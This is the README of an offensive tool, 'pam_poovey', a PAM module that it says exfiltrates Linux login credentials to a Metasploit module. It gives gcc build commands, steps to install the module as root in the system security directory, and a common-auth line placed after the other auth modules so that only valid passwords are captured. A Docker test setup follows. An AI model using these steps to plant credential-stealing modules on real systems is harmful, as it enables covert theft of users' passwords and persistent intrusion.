# pam_poovey

pam_poovey is a pam module that exfiltrates credentials and passes them to a metasploit module to integrate into it's credential management system.

## Building

```sh
gcc -fPIC -DPIC -shared -rdynamic -o pam_poovey.so pam_poovey.c
```

# Installation

The location the module is placed will depend on the distribution of linux/unix that this is being used with but the rest of these steps will provide a proper installation.

```sh
cp pam_poovey.so /lib/x86_64-linux-gnu/security/
chown root:root /lib/x86_64-linux-gnu/security/pam_poovey.so
chmod 755 /lib/x86_64-linux-gnu/security/pam_poovey.so
```

With the module in place for pam to find the last step is to modify the pam configuration files to inform pam which options to use. This will vary from distro to distro, depending on how they configure pam, but you'll want to use this with the other "auth" entries and it should occur at the end so that a user can be authenticated by other modules before exfiltrating the password. This will cut down on false positives.

File: /etc/pam.d/common-auth
```
auth    requisite                       pam_poovey.so
```

## Setup Test/Build Container

```
docker run -ti --rm -p22:2222 -v $HOME/src/poovey:/poovey ubuntu bash
```

```sh
apt update
apt install openssh-server build-essential vim libpam-dev
adduser test
mkdir /var/run/sshd
/usr/sbin/sshd
```